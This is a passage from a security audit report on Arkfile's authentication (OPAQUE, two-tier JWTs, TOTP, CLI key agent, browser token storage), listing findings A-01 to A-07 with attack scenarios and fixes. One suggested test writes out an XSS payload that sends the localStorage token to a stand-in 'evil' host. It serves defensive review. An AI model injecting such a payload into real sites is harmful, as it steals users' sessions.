# Slice A — Authentication & OPAQUE

Status: **Complete** (2026-05-11). This is the consolidated, definitive deliverable for Slice A of the Arkfile in-depth security review per `docs/wip/idsrp.md`. It covers the full server-side OPAQUE / JWT / TOTP surface, the `arkfile-client` and `arkfile-admin` Go CLIs (including the local key-agent daemon), and the browser-side authentication TypeScript. The vendored libopaque / liboprf / libsodium internals are trusted per the plan; only the CGO boundary in `auth/opaque_wrapper.{c,h}` is line-by-line audited.

Findings are numbered `A-01` through `A-45`, severity-ordered, single series.

---

## 0. Scope

### `idsrp.md` sections covered

- **§3** (Frontend / WASM / TS) — auth-flow surface only; deeper WASM/SRI is Slice F.
- **§4** (OPAQUE — registration, login, server keys, identity binding, replay).
- **§9** (Session / cookie / token — JWT issuance, validation, refresh-token rotation, revocation, logout, cookie hygiene).
- **§14** (telemetry around auth — DEBUG_MODE log leaks, plaintext secrets in test/CLI output).
- **§15** (Password change / recovery — there is none; lost-device TOTP recovery is in scope).
- **§22.1** (CLIs as first-class surfaces — `arkfile-client`, `arkfile-admin`, agent daemon, password lifecycle, `--totp-secret` argv).
- **§22.2** (Mandatory TOTP / two-tier JWT — enrollment, verify, backup codes, lockout, per-endpoint chokepoint).

### Files actually read

| File | LOC | Purpose |
|---|---:|---|
| `auth/constants.go` | 17 | libopaque buffer sizes. |
| `auth/opaque_wrapper.h` | 52 | CGO boundary headers. |
| `auth/opaque_wrapper.c` | 151 | CGO boundary body — line-by-line audit. |
| `auth/opaque.go` | 171 | Server key management, user-record storage. |
| `auth/opaque_multi_step.go` | 282 | Server-side OPAQUE handshake. |
| `auth/opaque_client.go` | 217 | Client-side OPAQUE CGO mirror (used by CLI + dev_admin). |
| `auth/jwt.go` | 164 | JWT issuance: temp and full tokens; middleware. |
| `auth/keys.go` | 72 | Ed25519 key load via KeyManager. |
| `auth/token_revocation.go` | 287 | Per-JTI revocation cache + user-wide revoke. |
| `auth/bootstrap.go` | 113 | Bootstrap-token generation, storage, validation. |
| `auth/dev_admin.go` | 374 | Dev-admin OPAQUE+TOTP seeding (dev/test only). |
| `auth/totp.go` | 780 | TOTP enrollment, verify, backup codes, reset, replay log, encryption. |
| `auth/totp_test.go` | 430 | TOTP test coverage / gap analysis. |
| `auth/totp_backup_test.go` | 127 | Backup-code randomness tests; itself a finding source. |
| `crypto/opaque_validation.go` | 1 | Empty stub. |
| `crypto/password_validation.go` | 246 | Server-side password policy. |
| `crypto/totp_keys.go` | 92 | TOTP master-key load + HKDF user-key derivation. |
| `database/unified_schema.sql` (§49-160, 491-497) | — | `system_keys`, `user_totp`, `totp_usage_log`, `totp_backup_usage`. |
| `models/user.go` | 363 | User CRUD, admin flag, ApproveUser. |
| `models/refresh_token.go` | 206 | Refresh-token lifecycle. |
| `handlers/auth.go` | 1087 | OPAQUE register/login, TOTP setup/verify/auth/reset/status, refresh, logout, revoke. |
| `handlers/bootstrap.go` | 212 | Bootstrap admin registration. |
| `handlers/admin_auth.go` | 212 | Admin login (separate from regular login). |
| `handlers/middleware.go` | 630 | `RequireApproved`, `RequireAdmin`, `RequireTOTP`, `AdminMiddleware`, `CSPMiddleware`. |
| `handlers/rate_limiting.go` | 600 | TOTP / login / register rate-limit. |
| `handlers/route_config.go` | 260 | Route table; TOTP chokepoint coverage. |
| `cmd/arkfile-client/main.go` | 1637 | CLI entrypoint, OPAQUE flow, password lifecycle, session save, agent fork. |
| `cmd/arkfile-client/commands.go` | 2125 (targeted) | OPAQUE-bearing commands. |
| `cmd/arkfile-client/agent.go` | 883 | Key-agent daemon — Unix socket, mlock, session binding, wipe. |
| `cmd/arkfile-client/crypto_utils.go` | 323 | `generateTOTPCode`, chunk crypto helpers. |
| `cmd/arkfile-admin/main.go` | 2843 (targeted) | Admin bootstrap, OPAQUE+TOTP login, session save, readPassword. |
| `client/static/js/src/auth/login.ts` | 396 | Browser login + TOTP handoff. |
| `client/static/js/src/auth/register.ts` | 335 | Browser registration. |
| `client/static/js/src/auth/totp-setup.ts` | 413 | TOTP setup UI. |
| `client/static/js/src/auth/totp.ts` | 740 | TOTP modal + post-TOTP completion. |
| `client/static/js/src/utils/auth.ts` (§32-60) | — | `localStorage`-backed token store. |

### Out of scope (deferred to other slices)

- `crypto.EncryptGCM` / Argon2id / chunk-streaming primitive review — Slice B.
- Upload/download / chunk-replay / streaming-hash — Slice C.
- Sharing — Slice D.
- Per-endpoint rate-limit deep audit beyond TOTP, full admin-handler audit, billing math — Slice E.
- WASM SRI / `opaque.js` bundling / Caddyfile / systemd hardening / CSP — Slice F.

---

## 1. Architecture & Data-Flow Summary

### 1.1 OPAQUE multi-step protocol

Arkfile uses [libopaque](https://github.com/stef/libopaque) via CGO. Four-message multi-step protocol per ceremony.

**Registration**
```
Client                                                 Server
ClientCreateRegistrationRequest(password)
  -> M  --- POST /api/opaque/register/response  --->
                                                       CreateRegistrationResponse(M)
                                                         -> rpub, rsec (stored 15 min)
                              <-- {session_id, rpub} ---
ClientFinalizeRegistration(usrCtx, rpub, username)
  -> rrec, exportKey (UNUSED)
                  --- POST /api/opaque/register/finalize  --->
                                                       StoreUserRecord(rsec, rrec)
                                                       INSERT users + opaque_user_data
                                                       Issue TEMP TOTP JWT
                                                         (aud=arkfile-totp, requires_totp=true, TTL=20m)
                          <-- {temp_token, requires_totp_setup=true} ---
```

**Login**: same shape on `/api/opaque/login/{response,finalize}`. On successful `UserAuth` the server issues a TEMP TOTP token. Client then submits TOTP code to `/api/totp/auth` and receives a FULL JWT (aud=arkfile-api, requires_totp=false).

**Admin login**: `/api/admin/login/{response,finalize}` is structurally identical but enforces `user.IsAdmin` before issuing the response and again at finalize. `is_admin` is not in the JWT — it is re-derived from the DB at admin-endpoint time via `AdminMiddleware`.

### 1.2 Two-tier JWT enforcement — intended vs implemented

**Intended (per `idsrp.md` §22.2):**
```
OPAQUE ----> TEMP token (aud=arkfile-totp, requires_totp=true, TTL=20m)
               |
               | accepted ONLY by /api/totp/{setup,verify,auth}
               v
            TOTP verify
               |
               v
            FULL token (aud=arkfile-api, requires_totp=false)
               |
               | accepted by every protected route
               v
            Protected routes
```

**Implemented**: `auth/jwt.go:49-62, 152-163` defines `JWTMiddleware()` and `TOTPJWTMiddleware()` as **byte-for-byte identical** Echo JWT validators — both check only the Ed25519 signature. Both tokens are signed with the **same** Ed25519 key. The `aud` and `requires_totp` claims exist but are **not validated by any middleware**. The `RequireTOTP` gate checks only the DB flag `user_totp.enabled`, which every authenticated user already has. The temp token therefore reaches every protected route. See **A-01**.

### 1.3 Revocation model

```
Per-JTI revocation         RevokedTokens table       checked on EVERY request
  (RevokeToken)            + in-memory cache         by TokenRevocationMiddleware

User-wide revocation       RevokedTokens row with    checked ONLY in RefreshToken
  (RevokeAllUserJWTTokens) token_id="user-revoke:    handler (lazy "Netflix model")
                            <user>:<ts>"             — NOT in per-request middleware

Refresh-token revocation   refresh_tokens.revoked    checked at refresh time only
                           bool column

Refresh-token rotation     New refresh token on      old one revoked best-effort
                           every refresh             but no reuse-detection
```

The "Netflix-model" comment at `handlers/auth.go:49-51` documents the gap explicitly. Admin force-logout leaves an attacker up to 30 minutes of access (**A-09**).

### 1.4 Bootstrap admin path

```
First run:
  CheckAndGenerateBootstrapToken
    -> rand 32B token, hex-print to stdout via log.Printf
    -> store in system_keys (KeyManager)

  /api/bootstrap/register/{response,finalize}  (localhost-only c.RealIP check)
    -> validates token via subtle.ConstantTimeCompare
    -> creates admin user (is_admin=1, is_approved=1)
    -> token NOT yet deleted

First admin LOGIN (OPAQUE+TOTP success):
  TOTPAuth handler -> if user.IsAdmin and bootstrap_token still exists, delete it
```

Token has a **two-call lifetime** ("proof-of-life" pattern). Window for second-admin race during the first admin's setup. See **A-13** and **A-26**.

### 1.5 TOTP at-rest encryption model

```
TOTP master key (32 B, KeyManager: "totp_master_key_v1", type "totp")
   |
   | HKDF-SHA256(salt=nil, info="ARKFILE_TOTP_USER_KEY:<username>")
   v
per-user TOTP key (32 B, NEVER persisted, derived on demand)
   |
   | AES-256-GCM
   v
[ secret_encrypted ]         - base32 secret as bytes
[ backup_codes_encrypted ]   - JSON array of 10 plaintext backup codes
   stored in user_totp (BLOB columns)

totp_usage_log:    SHA-256(code), window_start, used_at    (no UNIQUE)
totp_backup_usage: SHA-256(backup_code), used_at           (no UNIQUE)
```

Two architectural facts:

1. The TOTP master key lives in the **same `system_keys` table** as the Ed25519 JWT key, the OPAQUE server key, and the bootstrap token (**A-18**). A full `system_keys` dump unlocks every server-side cryptographic guarantee at once.
2. **Backup codes are stored encrypted, not hashed.** A `system_keys` + DB dump yields plaintext backup codes for every user — there is no offline-cracking cost. This contradicts `idsrp.md` §22.2's "hashed (Argon2id or comparable)" expectation (**A-07**).

### 1.6 TOTP verify path

```
POST /api/totp/auth { code: "123456", is_backup: false }
   |  (temp TOTP JWT carried — but A-01 means a full JWT also works)
   v
TOTPRateLimitMiddleware("totp_auth")
   |  per-entity-ID (HMAC of IP); NOT per-user. Caps at 30 min.
   v
auth.RequiresTOTPFromToken(c)  -> if false: 400
   v
auth.ValidateTOTPCode(db, user, code)
   |  pquerna/otp ValidateCustom(period=30, skew=0, SHA-1, 6 digits)
   |    -> Skew=0 = only the CURRENT 30s window (A-37 contradicts comment)
   |  SHA-256(code) lookup in totp_usage_log for replay
   |    (no UNIQUE constraint)
   v
INSERT totp_usage_log row + UPDATE last_used
   v
GenerateFullAccessToken + CreateRefreshToken
```

No per-username failure counter. IP-rotating brute force is tractable in well under an hour (**A-08**).

### 1.7 CLI key-agent lifecycle

```
arkfile-client login --username U
   |
   | OPAQUE handshake (libopaque CGO)
   | + TOTP code submission
   v
DeriveAccountPasswordKey(password, username)  -- Argon2id (Slice B)
   |
   | clearBytes(password)
   v
AccountKey (32 B in Go heap)
   |
   | (optional) StoreAccountKey to agent
   v
+---------------------------------------------------+
|  arkfile-client __agent-daemon                    |
|  Unix socket: $HOME/.arkfile/agent-<uid>.sock     |
|    parent dir mode 0700                           |
|    socket mode 0600 (chmod after Listen)          |
|    UID validation: stat-based, NO SO_PEERCRED     |
|    NO MADV_DONTDUMP / NO PR_SET_DUMPABLE          |
|    mlock() best-effort                            |
|                                                   |
|  AccountKey lives 1-4 hours                       |
|  Session-bind: SHA-256(access_token)              |
|    mismatch -> wipe ALL sensitive data            |
+---------------------------------------------------+

session file: $HOME/.arkfile-session.json (mode 0600)
  username, access_token, refresh_token, expires_at, server_url
  NO KEK / NO OPAQUE export / NO TOTP material — OK
  initial save is non-atomic (A-43); refresh is atomic
```

Same-UID processes can talk to the agent (**A-21**).

### 1.8 Browser auth flow

```
POST /api/opaque/login/response   (clientSecret in sessionStorage)
POST /api/opaque/login/finalize   -> temp_token
   |
   | requires_totp_setup:
   |   setTokens(temp_token, '')  -> localStorage  [A-05]
   |   window.totpLoginData = { tempToken, username, password }  [A-04]
   |
   | requires_totp (enrolled):
   |   handleTOTPFlow({ tempToken, username, password })
   v
POST /api/totp/auth { code }
   v
setTokens(full_token, refresh_token)  -> localStorage  [A-05]
   v
completeLogin: deriveAccountPasswordKey(password, username)
```

Surfaces:
- `localStorage` holds both temp and full JWT. XSS = total takeover (**A-05**).
- `window.totpLoginData.password` is a same-origin global during the TOTP window (**A-04**).
- TOTP secret + manual entry + backup codes rendered as raw DOM text; persist until navigation (**A-22**).

---

## 2. Findings

Severity policy follows `idsrp.md` §18. Confidence is High unless noted otherwise — High means the path was read end to end with evidence; Medium means static reasoning is solid but the exact failure path was not reproduced; Low means suggestive only.

### Finding A-01: Two-tier JWT model not enforced — temp post-OPAQUE token grants access to every protected route

**Status (2026-05-12):** **RESOLVED.** Landed as a coordinated change set. Highlights (see `docs/wip/review/00-executive-summary.md` §"Remediation update (second tranche)" for the full file list):

- `auth/keys.go` mints two distinct Ed25519 keypairs: `jwt_signing_key_temp_v1` and `jwt_signing_key_full_v1`. Single-key path removed.
- `auth/jwt.go`:
  - `GenerateTemporaryTOTPToken` signs with the temp key (`aud=arkfile-totp`, `requires_totp=true`).
  - `GenerateFullAccessToken` signs with the full key (`aud=arkfile-api`, `requires_totp=false`).
  - The redundant `GenerateToken` function is deleted; `handlers/auth.go` `RefreshToken` now calls `GenerateFullAccessToken`.
  - `JWTMiddleware` and `TOTPJWTMiddleware` route through `ParseTokenFunc` using `jwt.NewParser(jwt.WithAudience(...), jwt.WithIssuer(...), jwt.WithValidMethods(...), jwt.WithExpirationRequired())` and validate against the per-tier public key. A temp token presented to a full-protected route fails at signature verification AND at audience verification.
  - New `auth.RequireFullJWT` defense-in-depth middleware rejects `claims.RequiresTOTP == true` and re-asserts `arkfile-api` audience.
  - `auth.RequiresTOTPFromToken` no longer panics on missing/malformed claims (closes A-39 ride-along).
- `handlers/route_config.go` wires `auth.RequireFullJWT` and `RequireTOTP` onto `totpProtectedGroup`, `pendingAllowedGroup`, `adminGroup`, and `devTestAdminGroup`. The latter two close the E-01 ride-along (admin group is now TOTP-gated at route level).
- `auth/token_revocation.go` `RevokeToken` accepts either tier via the new `parseEitherTierToken` helper, so logout works at any session stage.
- `handlers/export.go` `resolveExportAuthFromHeader` enforces `aud=arkfile-api` AND rejects `requires_totp=true` (closes E-19 ride-along); the export-token branch enforces `aud=arkfile-export` explicitly.
- `monitoring/key_health.go` `checkJWTSigningKey` queries `crypto.KeyManager.GetKey` for both new key IDs in `system_keys` (replaces stale file-path check).
- Frontend: a separate `temp_token` slot is added to `localStorage` (`AuthManager.{set,get,clear}TempToken`). `client/static/js/src/auth/login.ts` calls `setTempToken` instead of pre-populating the full-tier `token` slot. `totp.ts` and `totp-setup.ts` read the temp token for `/api/totp/*` calls and call `clearTempToken()` after verify succeeds. `clearAllSessionData()` purges all three slots.
- Regression tests:
  - `auth/jwt_test.go`: `TestGenerateFullAccessToken`, `TestGenerateTemporaryTOTPToken_ClaimsAndKey`, `TestJWTMiddleware_RejectsTempAudience`, `TestTOTPJWTMiddleware_RejectsFullAudience`, `TestJWTMiddleware_RejectsTempSignedWithFullKey`, `TestJWTMiddleware_RejectsForgedAudience`, `TestRequireFullJWT_RejectsRequiresTOTPTrue`, `TestRequiresTOTPFromToken_HandlesMissingClaims`.
  - `auth/token_revocation_test.go`: `TestRevokeToken_BothTiers` (validates parseEitherTierToken accepts temp + full tokens for revocation).
  - `handlers/admin_audience_test.go`: `TestAdminStackHead_RejectsTempToken_Before_DB`, `TestAdminStackHead_RejectsFullTokenWithRequiresTOTPTrue`, `TestTOTPProtectedStackHead_RejectsTempToken`, `TestAdminStackHead_AcceptsValidFullToken` (full middleware-stack tests proving the chain rejects temp tokens before reaching any DB lookup).
  - `client/static/js/src/__tests__/auth-manager.test.ts`: temp-tier slot tests (`getTempToken`, `setTempToken`, `clearTempToken`, `clearAllSessionData` purges it, `isAuthenticated` ignores it) plus `parseJwtToken` audience/`requires_totp` claim extraction tests.
- Test results: `go test ./...` all packages green; `bun test client/static/js/src/__tests__/` 333 tests passing across 16 files.

Cross-slice items downgraded by this fix: **E-19** (High) is RESOLVED via the export.go audience+requires_totp check; **A-39** (Low) is RESOLVED via the `*jwt.Token`/`*Claims` nil-safety hardening; **E-01** (Medium) is RESOLVED via the `RequireTOTP` addition to `adminGroup`/`devTestAdminGroup`. The cross-references at **A-02** (admin endpoints reachable with a post-OPAQUE temp token) and **A-05** (JWT in localStorage) revert to their per-slice baselines; both still require their own per-finding fix (A-02 requires no further action because the same code path is the one closed here; A-05 still requires the localStorage → HttpOnly cookie migration).

---

#### Original finding (preserved for the audit trail)


- **Severity:** Critical
- **Confidence:** High
- **Category:** authorization
- **Affected:**
  - `auth/jwt.go:49-62` (`JWTMiddleware`), `auth/jwt.go:152-163` (`TOTPJWTMiddleware`)
  - `auth/jwt.go:99-118` (`GenerateTemporaryTOTPToken`)
  - `handlers/middleware.go:521-551` (`RequireTOTP`)
  - `handlers/route_config.go:95-96`

**Description.** Arkfile issues two JWT classes intended to be cryptographically distinct: a post-OPAQUE temp token (`aud=arkfile-totp`, `requires_totp=true`, TTL=20m) valid only at `/api/totp/{setup,verify,auth}`, and a post-TOTP full token (`aud=arkfile-api`, `requires_totp=false`) required for every other protected route. Both tokens are signed with the same Ed25519 key. **Neither the audience claim nor `requires_totp` is enforced by any middleware.**

`JWTMiddleware()` configures only `SigningKey` and `SigningMethod`. `TOTPJWTMiddleware()` is byte-for-byte identical. The `RequireTOTP` gate at `handlers/middleware.go:521-551` only checks the DB flag `user_totp.enabled` — and since TOTP setup is mandatory before any full JWT can ever be issued, every authenticated user has `enabled=true`. The middleware lets any signed token through, including a fresh post-OPAQUE temp token.

**Evidence.** `auth/jwt.go:49-62`:
```go
func JWTMiddleware() echo.MiddlewareFunc {
    config := echojwt.Config{
        NewClaimsFunc: func(c echo.Context) jwt.Claims { return new(Claims) },
        SigningKey:    GetJWTPublicKey(),
        SigningMethod: jwt.SigningMethodEdDSA.Alg(),
        ErrorHandler: func(c echo.Context, err error) error {
            return echo.NewHTTPError(401, "Unauthorized")
        },
    }
    return echojwt.WithConfig(config)
}
```
`handlers/middleware.go:521-551` confirms `RequireTOTP` ignores `claims.RequiresTOTP`. `grep -r RequiresTOTP handlers/` finds only branching uses in `handlers/auth.go`, never gating.

**Attack scenario.**
1. Anyone with the user's password completes OPAQUE legitimately and receives a temp token.
2. Attacker sends `Authorization: Bearer <temp_token>` to `GET /api/files`.
3. `JWTMiddleware` accepts (signature valid); `TokenRevocationMiddleware` accepts (not revoked); `RequireApproved` accepts; `RequireTOTP` accepts (DB flag is set).
4. File list returned. TOTP never submitted.

**Impact.** Complete TOTP bypass for every TOTP-enrolled user. Phishing, credential reuse, browser extension, keylogger malware — any password-theft pathway yields full account access. The "second factor" is cosmetic at the protocol level.

**Recommendation.**
1. Enforce audience at the JWT-validation layer via `echojwt.Config.ParseTokenFunc`:
   ```go
   ParseTokenFunc: func(c echo.Context, raw string) (interface{}, error) {
       tok, err := defaultParse(raw)
       if err != nil { return nil, err }
       claims := tok.Claims.(*Claims)
       if claims.RequiresTOTP { return nil, errors.New("temp TOTP token; not valid here") }
       if !slices.Contains(claims.Audience, "arkfile-api") { return nil, errors.New("wrong aud") }
       return tok, nil
   },
   ```
2. Define `TOTPJWTMiddleware` distinctly — accept only `requires_totp=true, aud=arkfile-totp`.
3. Add explicit `RequireFullJWT` middleware on `totpProtectedGroup` and `adminGroup` (defense in depth).
4. Strongest: use separate Ed25519 keys per tier (`jwt_signing_key_temp_v1` and `jwt_signing_key_full_v1`).

**Suggested tests.**
- Negative: present a temp token to `/api/files` and assert 401/403.
- Negative: present a full JWT to `/api/totp/auth` and assert 400.
- Forge `aud=foo` with valid signature; assert rejection.

---

### Finding A-02: Admin endpoints reachable with a post-OPAQUE temp token

- **Severity:** High
- **Confidence:** High
- **Category:** authorization
- **Affected:**
  - `handlers/middleware.go:559-629` (`AdminMiddleware`)
  - `handlers/route_config.go:166-168`

**Description.** Compounds with A-01. The admin route group applies only `JWTMiddleware` + `AdminMiddleware`. It does not apply `RequireTOTP`. `AdminMiddleware` itself does not check `claims.RequiresTOTP`. Because `JWTMiddleware` accepts a temp token, an attacker who completes OPAQUE for an admin account immediately works against `/api/admin/*`. The localhost check inside `AdminMiddleware` is the only remaining barrier — and it depends on Caddy's `X-Forwarded-For` discipline (Open Question 2).

**Evidence.** `handlers/route_config.go:166-168`:
```go
adminGroup := Echo.Group("/api/admin")
adminGroup.Use(auth.JWTMiddleware())
adminGroup.Use(AdminMiddleware)
```
Admin group is never added to `totpProtectedGroup`.

**Attack scenario.**
1. Attacker enumerates admin usernames via A-24 (`/api/admin/login/response` differentiates by status).
2. Attacker compromises admin password.
3. Attacker completes OPAQUE against `/api/admin/login/*`, receives temp token.
4. Attacker sends temp token to `/api/admin/users/<target>/force-logout` and other admin routes.

**Impact.** Admin-level takeover from password compromise alone.

**Recommendation.** The A-01 fix resolves this when applied at `JWTMiddleware`. Defense in depth: prepend `RequireTOTP` to `adminGroup` and add an explicit `!claims.RequiresTOTP && slices.Contains(claims.Audience, "arkfile-api")` check inside `AdminMiddleware`.

**Suggested tests.** Same as A-01 applied to every `/api/admin/*` route.

---

### Finding A-03: `arkfile-admin readPassword()` returns immutable `string` — password lives in heap memory for the process lifetime

- **Severity:** High
- **Confidence:** High
- **Category:** memory-safety / privacy
- **Affected:**
  - `cmd/arkfile-admin/main.go:2804-2843` (`readPassword`)
  - `cmd/arkfile-admin/main.go:528-557` (bootstrap call sites)

**Description.** Compared to `arkfile-client`'s `readPassword` (returns `[]byte`, callers `clearBytes` after OPAQUE consumes it), `arkfile-admin`'s version returns a Go `string`. Strings are immutable in Go; their backing memory cannot be zeroized through any normal API. At the OPAQUE call the code does `[]byte(password)` — which copies the bytes into a second buffer that is also never zeroized. Then `auth.ClientCreateRegistrationRequest` internally does `C.CBytes(password)` (a third copy on the C heap, also not zeroed — A-38). The password exists in at least three places at the time of OPAQUE completion, all reachable from a process-memory inspector.

Additionally, `password != passwordConfirm` (`main.go:542`) is non-constant-time.

**Evidence.** `cmd/arkfile-admin/main.go:2804-2819`:
```go
func readPassword() (string, error) {
    ...
    if (fi.Mode() & os.ModeCharDevice) != 0 {
        bytePassword, err := term.ReadPassword(int(syscall.Stdin))
        ...
        return string(bytePassword), nil
    }
    ...
}
```
The `bytePassword` slice is itself not zeroed before the `string()` conversion (which copies anyway).

**Attack scenario.** Operator runs `arkfile-admin login` on a shared host. Within seconds of OPAQUE completion, an attacker who can read `/proc/<pid>/mem` (root, or same-UID with `ptrace_scope=0`) extracts the password from heap.

**Impact.** Admin password exfiltration via process-memory read.

**Recommendation.**
1. Change `readPassword` to return `[]byte` like `arkfile-client`.
2. Zero `bytePassword` after the conversion goes away (pass `[]byte` directly to OPAQUE).
3. Add `defer clearBytes(password)` matching `arkfile-client`.
4. Replace `password != passwordConfirm` with `subtle.ConstantTimeCompare`.

**Suggested tests.** Heap-dump after OPAQUE completes; assert plaintext password absent.

---

### Finding A-04: Browser stashes plaintext password on `window.totpLoginData` during TOTP entry

- **Severity:** High
- **Confidence:** High
- **Category:** privacy / frontend
- **Affected:**
  - `client/static/js/src/auth/login.ts:159-167`
  - `client/static/js/src/auth/totp.ts:208-215, 670-675`

**Description.** During the OPAQUE-login → TOTP-entry handoff:
```ts
window.totpLoginData = {
    tempToken: loginData.temp_token!,
    username: credentials.username,
    password: credentials.password,
};
```
`window` is the global object. Any same-origin script can read `window.totpLoginData.password` while the user is typing their TOTP code (typically 10-60 seconds). The post-TOTP cleanup (`totpLoginData.password = ''; delete (totpLoginData as any).password`) does NOT zeroize the underlying string — JS strings are immutable. V8's heap retains the string until GC, recoverable via DevTools memory profiling.

The comment in `login.ts:159-161` documents the design as deliberate. The deliberate-ness is the problem.

**Evidence.** Cited above.

**Attack scenario.**
1. A same-origin script loads (XSS, compromised npm dep, or a third-party CDN if CSP allows).
2. Script polls `window.totpLoginData` every 100 ms.
3. Alice logs in; script captures temp token + plaintext password before TOTP submission.
4. Combined with A-01, the temp token alone yields full access.
5. The password alone is replayable at the OPAQUE handshake — usable on any device, indefinitely.

**Impact.** Plaintext password exfiltration via any same-origin code execution. For a privacy-first crypto app this is critical.

**Recommendation.**
1. Stop stashing the password on `window`. Derive the AccountKey at OPAQUE-finalize time and carry the derived key (not the password) through the TOTP flow.
2. If the password is genuinely needed past OPAQUE finalize, use a module-private variable, not a `window` property.
3. Tighten CSP (Slice F) so non-Arkfile origins cannot inject scripts.

**Suggested tests.** Playwright: post-login, assert `window.totpLoginData` is undefined throughout the flow.

---

### Finding A-05: JWT (temp and full) and refresh token stored in `localStorage` — XSS = total takeover and TOTP bypass

- **Severity:** High
- **Confidence:** High
- **Category:** authorization / frontend
- **Affected:**
  - `client/static/js/src/utils/auth.ts:32-53`
  - `client/static/js/src/auth/login.ts:158, 226`

**Description.** `setTokens` writes to `localStorage`:
```ts
private static readonly TOKEN_KEY = 'token';
private static readonly REFRESH_TOKEN_KEY = 'refresh_token';

public static setTokens(token: string, refreshToken: string): void {
    localStorage.setItem(this.TOKEN_KEY, token);
    localStorage.setItem(this.REFRESH_TOKEN_KEY, refreshToken);
}
```
Any same-origin JS reads these. OWASP guidance for high-value bearer tokens: `HttpOnly; Secure; SameSite=Strict` cookies. localStorage is the wrong choice.

The temp token uses the same `token` key as the full token (`login.ts:158`) — so the storage layer cannot distinguish them, undoing A-01's "audience claim should distinguish" at the client.

**Evidence.** Cited above.

**Attack scenario.** Any XSS, malicious dependency, or compromised CDN reads `localStorage.getItem('token')` and `localStorage.getItem('refresh_token')`. Exfiltrates to an attacker domain. Access persists for up to 14 days via refresh rotation (A-10).

**Impact.** Total session takeover via any XSS. With A-01 unfixed, even a captured temp token suffices.

**Recommendation.**
1. Move JWTs to `__Host-` prefixed cookies: `Set-Cookie: __Host-Arkfile-Token=...; HttpOnly; Secure; SameSite=Strict; Path=/`.
2. Refresh token similarly, scoped to `Path=/api/refresh`.
3. `fetch` with `credentials: 'include'`.
4. CSRF protection via double-submit token or per-request synchronizer.
5. Strict CSP + Trusted Types (Slice F).

**Suggested tests.** Inject `<img src=x onerror="fetch('//evil/?t='+localStorage.getItem('token'))">` in a comment / filename field; assert the token is not exfiltrated (because it is HttpOnly).

---

### Finding A-06: `arkfile-client --totp-secret` argv flag exposes the 160-bit TOTP shared secret via `/proc/<pid>/cmdline`, shell history, CI logs

- **Severity:** High
- **Confidence:** High
- **Category:** privacy / authentication
- **Affected:**
  - `cmd/arkfile-client/main.go:701`
  - `cmd/arkfile-client/main.go:784-792`
  - `cmd/arkfile-client/crypto_utils.go:317-322`

**Description.** The CLI accepts `--totp-secret <BASE32>` "for scripted/test use" — the secret is converted to a live TOTP code via `totp.GenerateCode`. The 160-bit secret is the long-lived shared secret; once leaked, an attacker can generate codes for as long as the user does not rotate. For the duration of `arkfile-client login`:

- `/proc/<pid>/cmdline` (world-readable on most distros): contains the secret.
- Shell history (`~/.bash_history`, `~/.zsh_history`): retains the command permanently unless the user prefixes with a space AND has `HISTCONTROL=ignorespace`.
- Process accounting (acct/psacct): captures full command line.
- CI runners with `set -x`: expand variables into logs.

**Evidence.** `cmd/arkfile-client/main.go:701`:
```go
totpSecret := fs.String("totp-secret", "", "TOTP secret — CLI generates the code internally (for scripted/test use)")
```

**Attack scenario.**
1. CI uses `arkfile-client login --totp-secret $TOTP_SECRET` for E2E tests.
2. `set -x` (common for CI debugging) expands `$TOTP_SECRET`.
3. CI artifact storage retains the log indefinitely. Anyone with artifact read access has the secret.

**Impact.** Permanent TOTP-second-factor leakage. The user has no way to know it leaked; "rotate the TOTP secret" requires a working session and a working flow (which itself has A-15 issues).

**Recommendation.**
1. Remove the `--totp-secret` flag. Replace with `--totp-secret-env <ENV_VAR_NAME>` (env vars are not in `/proc/<pid>/cmdline`; they are in `/proc/<pid>/environ`, which has owner-only perms on most Linuxes) or `--totp-secret-stdin` (single line on stdin).
2. Add a `--totp-code <6DIGITS>` path for CI that already has a fresh code (the flag exists at `main.go:700`).
3. Until removed, the flag should emit a stderr deprecation warning on every use.

**Suggested tests.** Spawn `arkfile-client login --totp-secret X`; from a sibling process, read `/proc/<pid>/cmdline`; assert no match.

---

### Finding A-07: TOTP backup codes stored encrypted, not hashed — a `system_keys` + DB dump yields plaintext codes for every user

- **Severity:** High
- **Confidence:** High
- **Category:** cryptographic / at-rest data protection
- **Affected:**
  - `auth/totp.go:181-191` (`StoreTOTPSetup`)
  - `auth/totp.go:338-357` (`ValidateBackupCode` — decrypts on every login)
  - `auth/totp.go:695-708` (`decryptJSON`)
  - `crypto/totp_keys.go:53-77` (`DeriveTOTPUserKey`)

**Description.** Backup codes are stored as a plaintext JSON array, encrypted with AES-256-GCM under a key HKDF-derived from `totpMasterKey`. The master key lives in the same `system_keys` table as the OPAQUE server key, the JWT key, and the bootstrap token (A-18). A single compromise of `system_keys` + the `user_totp` table yields plaintext backup codes for every user — no offline-cracking cost, no per-code Argon2id slow-down.

`idsrp.md` §22.2 expects "hashed (Argon2id or comparable) and/or at-rest encrypted (never plaintext)". The current scheme satisfies the letter ("encrypted") but defeats the spirit ("one-way protection against an attacker with the DB"). Industry norm is Argon2id-hashed backup codes with per-code salt.

Worse: codes exist in plaintext **in server memory** during every `ValidateBackupCode` call. Combined with A-17 (`totpMasterKey` no mlock, no MADV_DONTDUMP, no zeroize), a memory disclosure or core dump on the server yields the master key, which yields every backup code.

**Evidence.** `auth/totp.go:181-191`:
```go
backupCodesJSON, err := json.Marshal(setup.BackupCodes)
...
backupCodesEncrypted, err := crypto.EncryptGCM(backupCodesJSON, totpKey)
```

**Attack scenario.**
1. Server compromise yields `system_keys` (e.g., disk snapshot, leaked backup).
2. Attacker also obtains `user_totp` rows.
3. For each victim: derive `totpKey = HKDF(masterKey, "ARKFILE_TOTP_USER_KEY:<username>")`, AES-GCM-decrypt, JSON-decode — 10 plaintext backup codes per user.
4. Use codes at `/api/totp/auth { is_backup: true }`. Replay log (A-16) is the only barrier; if a code has not been used, it works.

**Impact.** TOTP becomes single-factor against any "DB + master key" compromise. The encryption is fully reversible; there is no offline cost.

**Recommendation.**
1. Replace encrypted-JSON-blob with per-code Argon2id hashes: `totp_backup_codes(username, code_hash, used_at NULL, salt)` with per-code 16-byte random salt.
2. `ValidateBackupCode`: iterate the user's unused hashes, Argon2id-hash the submitted code with each salt, constant-time compare. On match, atomically mark used (`UPDATE WHERE used_at IS NULL`).
3. Regeneration: delete all rows for the user; insert 10 new hashed rows.
4. Argon2id parameters: tune to make 47-bit keyspace brute-force unrealistic on commodity GPUs.

**Suggested tests.** Property: decrypting any column on `user_totp` with the master key must NOT yield any of the plaintext codes returned at enrollment.

---

### Finding A-08: No per-user TOTP lockout — IP-rotation brute force is tractable in well under an hour

- **Severity:** High
